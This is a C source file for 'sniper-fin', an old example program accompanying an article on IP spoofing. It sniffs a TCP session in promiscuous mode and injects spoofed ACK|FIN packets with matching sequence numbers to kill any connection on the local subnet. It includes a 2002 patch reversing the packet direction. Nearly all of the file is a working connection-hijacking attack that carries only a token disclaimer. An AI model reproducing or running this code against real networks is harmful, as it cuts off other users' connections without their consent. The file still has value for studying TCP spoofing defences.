/*---=[ sniper-fin.c ]=---------------------------------------------------*/
/**************************************************************************/
/*  Sniper-fin - Example program on connection killing with IP spoofing   */
/*               using the FIN flag.                                      */
/*               (illustration for 'A short overview of IP spoofing')     */
/*                                                                        */
/*  Purpose - Killing any TCP connection on your subnet                   */
/*                                                                        */
/*  Author - Brecht Claerhout <Coder@reptile.rug.ac.be>                   */
/*           Serious advice, comments, statements, greets, always welcome */
/*           flames, moronic 3l33t >/dev/null                             */
/*                                                                        */
/*  Disclaimer - This program is for educational purposes only. I am in   */
/*               NO way responsible for what you do with this program,    */
/*               or any damage you or this program causes.                */
/*                                                                        */
/*  For whom - People with a little knowledge of TCP/IP, C source code    */
/*             and general UNIX. Otherwise, please keep your hands of,    */
/*             and catch up on those things first.                        */
/*                                                                        */
/*  Limited to - Linux 1.3.X or higher.                                   */
/*               ETHERNET support ("eth0" device)                         */
/*               If you network configuration differs it shouldn't be to  */
/*               hard to modify yourself. I got it working on PPP too,    */
/*               but I'm not including extra configuration possibilities  */
/*               because this would overload this first release that is   */
/*               only a demonstration of the mechanism.                   */
/*               Anyway if you only have ONE network device (slip,        */
/*               ppp,... ) after a quick look at this code and spoofit.h  */
/*               it will only take you a few secs to fix it...            */
/*               People with a bit of C knowledge and well known with     */
/*               their OS shouldn't have to much trouble to port the code.*/
/*               If you do, I would love to get the results.              */
/*                                                                        */
/*  Compiling - gcc -o sniper-fin sniper-fin.c                            */
/*                                                                        */
/*  Usage - Usage described in the spoofing article that came with this.  */
/*          If you didn't get this, try to get the full release...        */
/*                                                                        */
/*  See also - Sniffit (for getting the necessairy data on a connection)  */
/**************************************************************************/
                                                       
#include "spoofit.h"

/* Those 2 'defines' are important for putting the receiving device in  */
/* PROMISCUOUS mode                                                     */    
#define INTERFACE	"eth0" 
#define INTERFACE_PREFIX 14  

char SOURCE[100],DEST[100];
int SOURCE_P,DEST_P;

void main(int argc, char *argv[])
{
int i,stat;
int fd_send, fd_receive;
unsigned long sp_ack, sp_seq;
unsigned short flags;
struct sp_wait_packet pinfo;

if(argc != 5)
	{
	printf("usage: %s host1 port1 host2 port2\n",argv[0]);
	exit(0);
	}

/* preparing some work */
DEV_PREFIX = INTERFACE_PREFIX;
strcpy(SOURCE,argv[1]);
SOURCE_P=atoi(argv[2]);
strcpy(DEST,argv[3]);
DEST_P=atoi(argv[4]);

/* opening sending and receiving sockets */
fd_send = open_sending();
fd_receive = open_receiving(INTERFACE, IO_NONBLOCK); /* nonblocking IO */

for(i=1;i<100;i++)
  {
  printf("Attack Sequence %d.\n",i);
  /* Waiting for a packet containing an ACK */

  // ****************** Original
  // stat=wait_packet(fd_receive,&pinfo,SOURCE,SOURCE_P,DEST,DEST_P,ACK,10);
  // if(stat==-1)  {printf("Connection 10 secs idle... timeout.\n");exit(1);}
  // sp_seq=pinfo.ack;
  // sp_ack=pinfo.seq+pinfo.datalen;
  // ******************* End: Originial
  
  // *** Patrick's version (Feb 24, 2002)
  stat=wait_packet(fd_receive,&pinfo,DEST,DEST_P,SOURCE,SOURCE_P,ACK,10);
  if(stat==-1)  {printf("Connection 10 secs idle...  timeout.\n");exit(1);}
  sp_seq=pinfo.seq+pinfo.datalen;
  sp_ack=pinfo.ack;
  // *** End: Patrick's version
  
  /* Sending our fake Packet */
  transmit_TCP (fd_send, NULL,0,0,0,DEST,DEST_P,SOURCE,SOURCE_P,sp_seq,sp_ack,ACK|FIN);
  /* waiting for confirmation */
  stat=wait_packet(fd_receive,&pinfo,SOURCE,SOURCE_P,DEST,DEST_P,FIN,5);
  if(stat>=0)
      {
      printf("Killed the connection...\n");
      exit(0);
      }  
  printf("Hmmmm.... no response detected... (retry)\n");
  }
printf("I did not succeed in killing it.\n");
}


